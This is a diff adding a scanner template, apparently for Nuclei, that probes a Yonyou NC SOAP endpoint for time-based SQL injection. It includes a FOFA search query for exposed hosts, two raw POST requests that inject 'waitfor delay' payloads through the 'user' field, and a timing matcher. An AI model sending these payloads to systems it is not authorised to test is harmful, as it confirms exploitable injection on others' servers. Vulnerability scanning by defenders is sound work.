@@ -1,0 +1,58 @@
+id: YongYou-NC-IMsgCenterWebService-SQL-Time
+
+info:
+  name: 用友-NC /uapws/service/nc.itf.msgcenter.IMsgCenterWebService SQL延时注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: app="用友-UFIDA-NC"
+    用友-NC /uapws/service/nc.itf.msgcenter.IMsgCenterWebService 接口存在SQL延时注入漏洞，攻击者可以通过构造恶意的SQL语句，利用数据库的延时函数来判断注入点，从而进一步获取数据库中的敏感信息。
+  reference:
+    - 
+  tags: sql-time, yongyou, nc
+
+http:
+  - raw:
+      - |-
+        POST /uapws/service/nc.itf.msgcenter.IMsgCenterWebService HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: urn:doAction
+        Content-Type: text/xml;charset=UTF-8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ims="http://msgcenter.itf.nc/IMsgCenterWebService">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <ims:doAction>
+                 <dataSource>NC65</dataSource>
+                 <actionCode>test</actionCode>
+                 <pluginType>test</pluginType>
+                 <param>{"user":"'waitfor delay'0:0:4","pk_sourcemsg":""}</param>
+              </ims:doAction>
+           </soapenv:Body>
+        </soapenv:Envelope>
+
+      - |-
+        POST /uapws/service/nc.itf.msgcenter.IMsgCenterWebService HTTP/1.1
+        Host: {{Hostname}}
+        SOAPAction: urn:doAction
+        Content-Type: text/xml;charset=UTF-8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ims="http://msgcenter.itf.nc/IMsgCenterWebService">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <ims:doAction>
+                 <dataSource>NC65</dataSource>
+                 <actionCode>test</actionCode>
+                 <pluginType>test</pluginType>
+                 <param>{"user":"'waitfor delay'0:0:8","pk_sourcemsg":""}</param>
+              </ims:doAction>
+           </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers:
+      - type: dsl
+        name: SQL延时注入
+        dsl:
+          - "status_code==200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9"
